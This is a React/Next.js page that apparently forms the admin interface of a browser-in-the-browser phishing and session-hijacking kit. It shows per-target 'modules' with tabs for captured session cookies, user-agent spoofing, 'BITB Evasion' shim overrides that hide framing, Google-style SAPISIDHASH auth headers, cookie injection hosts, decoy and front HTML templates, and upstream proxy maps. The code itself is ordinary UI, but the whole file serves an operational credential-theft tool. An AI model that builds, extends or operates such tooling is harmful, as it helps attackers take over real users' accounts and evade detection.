import * as React from "react";
import Link from "next/link";
import { useRouter } from "next/router";
import {
  PanelLeft, ArrowLeft, Copy, Download, Loader2,
  FileCode, Globe, Blocks, Code2, Shield, Settings as SettingsIcon,
  ChevronRight, FileText, Eye, FileJson, FileTerm, FileArchive,
} from "lucide-react";
import { AppSidebar } from "@/components/app-sidebar";
import {
  Drawer, cx, Card, GhostButton, BlueButton, Badge, Favicon,
  useDismiss,
} from "@/components/ui";
import { useIsDesktop } from "@/components/use-media-query";
import { api } from "@/lib-engine/api";
import { CodeEditor } from "@/components/code-editor";

const TABS = [
  { id: "overview", label: "Overview", icon: Blocks },
  { id: "files", label: "Files", icon: Code2 },
  { id: "capture", label: "Capture Config", icon: SettingsIcon },
  { id: "evasion", label: "BITB Evasion", icon: Shield },
  { id: "auth", label: "Auth & Fronts", icon: FileText },
  { id: "upstream", label: "Upstream Map", icon: Globe },
];

export default function ModuleDetailPage() {
  const router = useRouter();
  const { id } = router.query;
  const isDesktop = useIsDesktop();
  const [collapsed, setCollapsed] = React.useState(false);
  const [drawerOpen, setDrawerOpen] = React.useState(false);

  const [mod, setMod] = React.useState(null);
  const [loading, setLoading] = React.useState(true);
  const [error, setError] = React.useState("");
  const [activeTab, setActiveTab] = React.useState("overview");
  const [moduleFiles, setModuleFiles] = React.useState(null);
  const [fileContents, setFileContents] = React.useState({});
  const [loadingFile, setLoadingFile] = React.useState(null);
  const [viewingFront, setViewingFront] = React.useState(null);

  const showFloatingToggle = isDesktop ? collapsed : true;

  React.useEffect(() => {
    if (!id) return;
    (async () => {
      try {
        const res = await api.getModule(id);
        setMod(res.module);
        
        if (res.module?._package_type === "package" || res.module?._hookFiles) {
          try {
            const filesRes = await api.getModuleFiles(id);
            setModuleFiles(filesRes.files || []);
          } catch {
            setModuleFiles([]);
          }
        }
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    })();
  }, [id]);

  async function loadModuleFile(filename) {
    if (fileContents[filename] !== undefined) return;
    setLoadingFile(filename);
    try {
      const res = await api.getModuleFile(id, filename);
      if (res.truncated) {
        setFileContents((prev) => ({ ...prev, [filename]: `// File too large (${Math.round(res.size / 1024)}KB) to display` }));
      } else {
        setFileContents((prev) => ({ ...prev, [filename]: res.content }));
      }
    } catch (err) {
      setFileContents((prev) => ({ ...prev, [filename]: `// Error loading: ${err.message}` }));
    } finally {
      setLoadingFile(null);
    }
  }

  async function handleExport() {
    try {
      const data = await api.exportModule(id);
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${id}.json`;
      a.click();
      URL.revokeObjectURL(url);
    } catch (err) {
      setError(err.message);
    }
  }

  async function handleDuplicate() {
    try {
      const res = await api.duplicateModule(id);
      router.push(`/modules/${res.module.id}`);
    } catch (err) {
      setError(err.message);
    }
  }

  const hookFiles = mod?._hookFiles ? Object.keys(mod._hookFiles) : [];
  const isPackage = mod?._package_type === "package" || (hookFiles.length > 0) || (moduleFiles && moduleFiles.length > 0);

  return (
    <div className="flex h-screen w-full overflow-hidden bg-canvas">
      {isDesktop ? (
        <AppSidebar collapsed={collapsed} onToggle={() => setCollapsed((v) => !v)} />
      ) : (
        <Drawer open={drawerOpen} onClose={() => setDrawerOpen(false)}>
          <AppSidebar collapsed={false} variant="drawer" onToggle={() => setDrawerOpen(false)} />
        </Drawer>
      )}

      <main className="scroll-thin relative flex-1 overflow-y-auto">
        {showFloatingToggle ? (
          <button
            type="button"
            title={isDesktop ? "Expand sidebar" : "Open menu"}
            onClick={() => (isDesktop ? setCollapsed(false) : setDrawerOpen(true))}
            className="absolute left-[14px] top-[10px] z-20 flex h-[26px] w-[26px] items-center justify-center rounded-[5px] text-fg2 transition-colors hover:bg-line hover:text-fg md:left-[20px] md:top-[8px] md:h-[24px] md:w-[24px]"
          >
            <PanelLeft className="h-[15px] w-[15px]" strokeWidth={1.8} />
          </button>
        ) : null}

        <div className="mx-auto w-full max-w-[900px] px-[16px] pb-[80px] pt-[60px] md:px-[24px] md:pt-[72px]">
          {}
          <div className="mb-[16px] px-[8px]">
            <Link href="/modules" className="inline-flex items-center gap-[5px] text-[12.5px] text-fg3 transition-colors hover:text-fg">
              <ArrowLeft className="h-[13px] w-[13px]" strokeWidth={1.8} />
              Back to modules
            </Link>
          </div>

          {error ? (
            <div className="mb-[16px] border-l-2 border-error bg-errorSurface/30 px-[14px] py-[10px] text-[12.5px] text-error">
              {error}
            </div>
          ) : null}

          {loading ? (
            <div className="flex items-center justify-center py-[80px]">
              <Loader2 className="h-[24px] w-[24px] animate-spin text-fg3" />
            </div>
          ) : !mod ? (
            <Card className="p-[24px] text-center text-[12.5px] text-fg3">Module not found.</Card>
          ) : (
            <>
              {}
              <div className="mb-[20px] flex flex-col gap-[12px] px-[8px] sm:flex-row sm:items-start sm:justify-between">
                <div className="flex min-w-0 items-center gap-[12px]">
                  {mod.type === 'inject' ? (
                    <div className="flex h-[32px] w-[32px] items-center justify-center rounded-[6px] bg-surface">
                      <FileCode className="h-[16px] w-[16px] text-fg3" strokeWidth={1.8} />
                    </div>
                  ) : (
                    <Favicon url={mod.target_url} size={32} />
                  )}
                  <div className="min-w-0">
                    <div className="flex flex-wrap items-center gap-[8px]">
                      <h1 className="truncate text-[20px] font-bold tracking-tight text-fg">{mod.name}</h1>
                      {mod.is_default ? <Badge tone="new">Default</Badge> : null}
                      <Badge tone={mod.type === 'inject' ? 'new' : ''}>{mod.type === 'inject' ? 'Inject' : 'Capture'}</Badge>
                      {mod.api_version ? <Badge>v{mod.api_version}</Badge> : null}
                      {isPackage ? <Badge tone="new">Package</Badge> : <Badge>Flat</Badge>}
                    </div>
                    <p className="mt-[2px] truncate text-[12.5px] text-fg3">{mod.description || "No description"}</p>
                  </div>
                </div>
                <div className="flex shrink-0 items-center gap-[6px]">
                  <GhostButton onClick={handleDuplicate}><Copy className="h-[12px] w-[12px]" /> Duplicate</GhostButton>
                  <GhostButton onClick={handleExport}><Download className="h-[12px] w-[12px]" /> Export</GhostButton>
                </div>
              </div>

              {}
              <div className="mb-[16px] flex gap-[2px] overflow-x-auto border-b border-line px-[8px]">
                {TABS.map((tab) => {
                  
                  if (tab.id === "files" && !isPackage) return null;
                  const Icon = tab.icon;
                  return (
                    <button
                      key={tab.id}
                      type="button"
                      onClick={() => setActiveTab(tab.id)}
                      className={cx(
                        "flex h-[34px] shrink-0 items-center gap-[6px] border-b-[2px] px-[10px] text-[12.5px] transition-colors",
                        activeTab === tab.id
                          ? "border-accent text-fg"
                          : "border-transparent text-fg3 hover:text-fg"
                      )}
                    >
                      <Icon className="h-[13px] w-[13px]" strokeWidth={1.8} />
                      {tab.label}
                    </button>
                  );
                })}
              </div>

              {}
              <div className="px-[8px]">
                {activeTab === "overview" ? <OverviewTab mod={mod} /> : null}
                {activeTab === "files" ? (
                  <FilesTab
                    files={moduleFiles}
                    fileContents={fileContents}
                    loadingFile={loadingFile}
                    onLoadFile={loadModuleFile}
                    isPackage={isPackage}
                  />
                ) : null}
                {activeTab === "capture" ? <CaptureConfigTab mod={mod} /> : null}
                {activeTab === "evasion" ? <EvasionTab mod={mod} /> : null}
                {activeTab === "auth" ? (
                  <AuthFrontsTab mod={mod} onViewFront={setViewingFront} />
                ) : null}
                {activeTab === "upstream" ? <UpstreamTab mod={mod} /> : null}
              </div>
            </>
          )}
        </div>

        {}
        {viewingFront ? (
          <FrontViewer front={viewingFront} onClose={() => setViewingFront(null)} />
        ) : null}
      </main>
    </div>
  );
}



function OverviewTab({ mod }) {
  const rows = [
    { label: "ID", value: mod.id },
    { label: "Name", value: mod.name },
    { label: "Description", value: mod.description || "—" },
    { label: "Type", value: mod.type || "capture" },
    { label: "API version", value: mod.api_version || 1 },
    { label: "Package type", value: mod._package_type || "flat" },
    { label: "Target URL", value: mod.target_url || "—" },
    { label: "Trigger", value: mod.trigger || "engine" },
    { label: "FIDO2 supported", value: mod.fido2_supported ? "Yes" : "No" },
    { label: "Extends", value: mod.extends || "—" },
    { label: "Created", value: mod.created_at ? new Date(mod.created_at).toLocaleString() : "—" },
    { label: "Updated", value: mod.updated_at ? new Date(mod.updated_at).toLocaleString() : "—" },
  ];

  return (
    <Card className="p-[16px]">
      <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Module details</div>
      <div className="divide-y divide-line">
        {rows.map((row) => (
          <div key={row.label} className="flex py-[8px] text-[12.5px]">
            <span className="w-[140px] shrink-0 text-fg3">{row.label}</span>
            <span className="min-w-0 flex-1 text-fg">{row.value}</span>
          </div>
        ))}
      </div>
    </Card>
  );
}



function fileIcon(ext) {
  if (ext === "js") return FileCode;
  if (ext === "json") return FileJson;
  if (ext === "md") return FileText;
  if (ext === "txt") return FileTerm;
  if (ext === "html") return FileArchive;
  if (ext === "css") return Code2;
  return FileText;
}

function fileLang(ext) {
  if (ext === "js") return "javascript";
  if (ext === "json") return "json";
  if (ext === "html") return "html";
  if (ext === "css") return "css";
  if (ext === "md") return "markdown";
  return "text";
}

function FilesTab({ files, fileContents, loadingFile, onLoadFile, isPackage }) {
  const [selectedFile, setSelectedFile] = React.useState(null);

  React.useEffect(() => {
    if (files && files.length > 0 && !selectedFile) {
      setSelectedFile(files[0].name);
      onLoadFile(files[0].name);
    }
  }, [files, selectedFile, onLoadFile]);

  React.useEffect(() => {
    if (selectedFile && fileContents[selectedFile] === undefined) {
      onLoadFile(selectedFile);
    }
  }, [selectedFile, fileContents, onLoadFile]);

  if (!isPackage) {
    return (
      <Card className="p-[24px] text-center text-[12.5px] text-fg3">
        No files. This is a flat module stored as a single JSON config.
      </Card>
    );
  }

  if (!files || files.length === 0) {
    return (
      <Card className="p-[24px] text-center text-[12.5px] text-fg3">
        No files found in module directory.
      </Card>
    );
  }

  const selected = files.find((f) => f.name === selectedFile);
  const lang = selected ? fileLang(selected.ext) : "text";

  return (
    <div className="flex flex-col gap-[12px] sm:flex-row">
      {}
      <div className="w-full shrink-0 sm:w-[220px]">
        <div className="mb-[6px] flex items-center justify-between">
          <span className="text-[11px] font-medium uppercase tracking-wide text-fg4">
            {files.length} file{files.length !== 1 ? "s" : ""}
          </span>
        </div>
        <div className="space-y-[2px]">
          {files.map((file) => {
            const Icon = fileIcon(file.ext);
            return (
              <button
                key={file.name}
                type="button"
                onClick={() => setSelectedFile(file.name)}
                className={cx(
                  "flex w-full items-center gap-[7px] rounded-[6px] px-[8px] py-[7px] text-[12px] transition-colors",
                  selectedFile === file.name ? "bg-line text-fg" : "text-fg3 hover:bg-hover hover:text-fg"
                )}
              >
                <Icon className="h-[12px] w-[12px] shrink-0" strokeWidth={1.8} />
                <span className="truncate font-mono">{file.name}</span>
                <span className="ml-auto shrink-0 text-[9.5px] text-fg4">
                  {file.size > 1024 ? `${Math.round(file.size / 1024)}K` : `${file.size}B`}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {}
      <div className="min-w-0 flex-1">
        <div className="mb-[6px] flex items-center justify-between">
          <span className="truncate font-mono text-[11px] font-medium text-fg3">
            {selectedFile || "Select a file"}
          </span>
          <span className="shrink-0 text-[10.5px] text-fg4">Read-only</span>
        </div>
        {selectedFile ? (
          loadingFile === selectedFile && fileContents[selectedFile] === undefined ? (
            <div className="flex h-[300px] items-center justify-center rounded-[6px] border border-stroke bg-panel">
              <Loader2 className="h-[20px] w-[20px] animate-spin text-fg3" />
            </div>
          ) : (
            <CodeEditor
              value={fileContents[selectedFile] || ""}
              language={lang}
              height="500px"
              readOnly
            />
          )
        ) : (
          <Card className="p-[24px] text-center text-[12.5px] text-fg3">Select a file to view</Card>
        )}
      </div>
    </div>
  );
}



function CaptureConfigTab({ mod }) {
  const sc = mod.bitb_session_cookies;
  const ua = mod.bitb_user_agent;
  const completionPaths = mod.bitb_completion_paths || [];
  const completionHosts = mod.bitb_completion_host_patterns || [];
  const decoys = mod.bitb_decoys || [];
  const redirectUrl = mod.bitb_redirect_url;

  return (
    <div className="space-y-[14px]">
      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Session cookies</div>
        {sc && (sc.start_cookie_names || []).length > 0 ? (
          <div className="space-y-[8px]">
            <CookieList label="Start cookies" cookies={sc.start_cookie_names || []} />
            <CookieList label="Flush cookies" cookies={sc.flush_cookie_names || []} />
            <CookieList label="Exclude from flush" cookies={sc.exclude_from_flush || []} />
            {sc.share_between_hosts ? (
              <div className="text-[12px] text-fg3">Shared between hosts: <span className="text-fg">Yes</span></div>
            ) : null}
          </div>
        ) : (
          <EmptyValue text="No session cookie configuration" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">User agent</div>
        {ua && ua.mode && ua.mode !== "passthrough" ? (
          <div className="space-y-[6px] text-[12.5px]">
            <KVRow label="Mode" value={ua.mode} />
            {ua.value ? <KVRow label="User agent" value={ua.value} /> : null}
            {ua.sec_ch_ua ? <KVRow label="sec-ch-ua" value={ua.sec_ch_ua} /> : null}
            {ua.sec_ch_ua_platform ? <KVRow label="sec-ch-ua-platform" value={ua.sec_ch_ua_platform} /> : null}
            {ua.sec_ch_ua_mobile ? <KVRow label="sec-ch-ua-mobile" value={ua.sec_ch_ua_mobile} /> : null}
          </div>
        ) : (
          <EmptyValue text="Passthrough (no override)" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Completion paths</div>
        {completionPaths.length > 0 ? (
          <TagList items={completionPaths} />
        ) : (
          <EmptyValue text="No completion paths configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Completion host patterns</div>
        {completionHosts.length > 0 ? (
          <TagList items={completionHosts} />
        ) : (
          <EmptyValue text="No host patterns configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Decoys</div>
        {decoys.length > 0 ? (
          <TagList items={decoys} />
        ) : (
          <EmptyValue text="No decoys configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Redirect URL</div>
        {redirectUrl ? (
          <div className="text-[12.5px] text-fg">{redirectUrl}</div>
        ) : (
          <EmptyValue text="No redirect URL configured" />
        )}
      </Card>
    </div>
  );
}



function EvasionTab({ mod }) {
  const so = mod.bitb_shim_overrides || {};
  const xsrfPatterns = mod.bitb_xsrf_header_patterns || [];
  const authHeader = mod.bitb_authorization_header;
  const protectedBlobs = mod.bitb_protected_data_blobs || [];
  const urlRewrites = mod.bitb_url_param_rewrites || {};
  const cookieHosts = mod.bitb_cookie_injection_hosts || [];

  const shimFlags = [
    "skip_navigator_overrides",
    "override_frame_element",
    "override_referrer",
    "override_ancestor_origins",
    "override_window_parent",
  ];

  return (
    <div className="space-y-[14px]">
      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Shim overrides</div>
        {Object.keys(so).length > 0 ? (
          <div className="space-y-[4px]">
            {shimFlags.map((flag) => (
              <div key={flag} className="flex items-center justify-between py-[3px] text-[12.5px]">
                <span className="text-fg3">{flag}</span>
                <span className={so[flag] ? "text-success" : "text-fg4"}>
                  {so[flag] ? "Enabled" : "Disabled"}
                </span>
              </div>
            ))}
            {}
            {Object.keys(so).filter(k => !shimFlags.includes(k)).map((k) => (
              <div key={k} className="flex items-center justify-between py-[3px] text-[12.5px]">
                <span className="text-fg3">{k}</span>
                <span className="text-fg">{String(so[k])}</span>
              </div>
            ))}
          </div>
        ) : (
          <EmptyValue text="No shim overrides configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">XSRF header patterns</div>
        {xsrfPatterns.length > 0 ? (
          <TagList items={xsrfPatterns} />
        ) : (
          <EmptyValue text="No XSRF patterns configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Authorization header</div>
        {authHeader && authHeader.url_patterns && authHeader.url_patterns.length > 0 ? (
          <div className="space-y-[6px] text-[12.5px]">
            <KVRow label="Cookie names" value={(authHeader.cookie_names || []).join(", ")} />
            <KVRow label="Format" value={authHeader.format || "SAPISIDHASH"} />
            <KVRow label="Hash algorithm" value={authHeader.hash_algorithm || "SHA-1"} />
            <div>
              <div className="mb-[4px] text-fg3">URL patterns:</div>
              <TagList items={authHeader.url_patterns} />
            </div>
          </div>
        ) : (
          <EmptyValue text="No authorization header configuration" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Protected data blobs</div>
        {protectedBlobs.length > 0 ? (
          <TagList items={protectedBlobs} />
        ) : (
          <EmptyValue text="No protected data blobs configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">URL param rewrites</div>
        {Object.keys(urlRewrites).length > 0 ? (
          <div className="space-y-[4px]">
            {Object.entries(urlRewrites).map(([from, to]) => (
              <div key={from} className="flex items-center gap-[8px] text-[12.5px]">
                <code className="text-fg">{from}</code>
                <ChevronRight className="h-[10px] w-[10px] text-fg4" />
                <code className="text-fg">{to}</code>
              </div>
            ))}
          </div>
        ) : (
          <EmptyValue text="No URL param rewrites configured" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Cookie injection hosts</div>
        {cookieHosts.length > 0 ? (
          <TagList items={cookieHosts} />
        ) : (
          <EmptyValue text="No cookie injection hosts configured" />
        )}
      </Card>
    </div>
  );
}



function AuthFrontsTab({ mod, onViewFront }) {
  const fronts = mod.bitb_front_templates || [];

  return (
    <div className="space-y-[14px]">
      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Auth landing HTML</div>
        {mod.auth_landing_html ? (
          <CodeEditor value={mod.auth_landing_html} height="300px" readOnly />
        ) : (
          <EmptyValue text="No auth landing HTML" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Auth complete HTML</div>
        {mod.auth_complete_html ? (
          <CodeEditor value={mod.auth_complete_html} height="200px" readOnly />
        ) : (
          <EmptyValue text="No auth complete HTML" />
        )}
      </Card>

      {}
      <Card className="p-[16px]">
        <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">BITB front templates</div>
        {fronts.length > 0 ? (
          <div className="space-y-[8px]">
            {fronts.map((front) => (
              <div
                key={front.id}
                className="flex items-center justify-between rounded-[8px] border border-stroke bg-panel px-[12px] py-[10px]"
              >
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-[6px]">
                    <FileCode className="h-[13px] w-[13px] shrink-0 text-fg3" />
                    <span className="truncate text-[12.5px] font-medium text-fg">{front.name}</span>
                    <code className="shrink-0 text-[10px] text-fg4">{front.id}</code>
                  </div>
                  <p className="mt-[2px] truncate text-[11px] text-fg4">{front.description}</p>
                </div>
                <button
                  type="button"
                  onClick={() => onViewFront(front)}
                  className="flex h-[26px] shrink-0 items-center gap-[4px] rounded-[5px] border border-stroke bg-raised px-[8px] text-[11px] text-fg3 hover:text-fg hover:bg-pressed"
                >
                  <Eye className="h-[11px] w-[11px]" /> View
                </button>
              </div>
            ))}
          </div>
        ) : (
          <EmptyValue text="No BITB front templates" />
        )}
      </Card>
    </div>
  );
}



function UpstreamTab({ mod }) {
  const map = mod.upstream_map || {};
  const entries = Object.keys(map);

  return (
    <Card className="p-[16px]">
      <div className="mb-[10px] text-[11px] font-medium uppercase tracking-wide text-fg4">Upstream map</div>
      {entries.length > 0 ? (
        <div className="space-y-[4px]">
          {entries.map((prefix) => {
            const val = map[prefix];
            const host = typeof val === "string" ? val : (val?.host || val?.upstream || JSON.stringify(val));
            return (
              <div key={prefix} className="flex items-center gap-[8px] rounded-[6px] bg-panel px-[10px] py-[6px] text-[12.5px]">
                <code className="shrink-0 text-fg">{prefix}</code>
                <ChevronRight className="h-[10px] w-[10px] text-fg4" />
                <code className="min-w-0 truncate text-fg3">{host}</code>
              </div>
            );
          })}
        </div>
      ) : (
        <EmptyValue text="No upstream map configured" />
      )}
    </Card>
  );
}



function FrontViewer({ front, onClose }) {
  return (
    <div className="fixed inset-0 z-[100] flex items-end justify-center bg-black/60 sm:items-center sm:p-[16px]" onClick={onClose}>
      <div
        className="w-full max-w-[900px] overflow-hidden rounded-t-[16px] border border-stroke bg-canvas sm:rounded-[10px] max-h-[90vh] flex flex-col animate-slideUp sm:animate-popIn"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between gap-[8px] border-b border-line px-[16px] py-[12px]">
          <h3 className="truncate text-[15px] font-semibold text-fg">{front.name}</h3>
          <button type="button" onClick={onClose} className="shrink-0 text-fg4 hover:text-fg text-[14px]">✕</button>
        </div>
        <div className="overflow-y-auto p-[16px]">
          <div className="mb-[8px] text-[11px] text-fg4">{front.description}</div>
          <CodeEditor value={front.html} height="400px" readOnly />
        </div>
      </div>
    </div>
  );
}



function KVRow({ label, value }) {
  return (
    <div className="flex gap-[8px]">
      <span className="w-[140px] shrink-0 text-fg3">{label}</span>
      <span className="min-w-0 flex-1 break-all text-fg">{value}</span>
    </div>
  );
}

function CookieList({ label, cookies }) {
  if (!cookies || cookies.length === 0) return null;
  return (
    <div>
      <div className="mb-[4px] text-[11px] text-fg4">{label}</div>
      <div className="flex flex-wrap gap-[4px]">
        {cookies.map((c) => (
          <code key={c} className="rounded-[4px] bg-surface px-[6px] py-[2px] text-[11px] text-fg2">{c}</code>
        ))}
      </div>
    </div>
  );
}

function TagList({ items }) {
  return (
    <div className="flex flex-wrap gap-[4px]">
      {items.map((item, i) => (
        <code
          key={typeof item === "string" ? item : i}
          className="rounded-[4px] bg-surface px-[6px] py-[2px] text-[11px] text-fg2"
        >
          {typeof item === "string" ? item : JSON.stringify(item)}
        </code>
      ))}
    </div>
  );
}

function EmptyValue({ text }) {
  return <div className="text-[12px] text-fg4">{text}</div>;
}
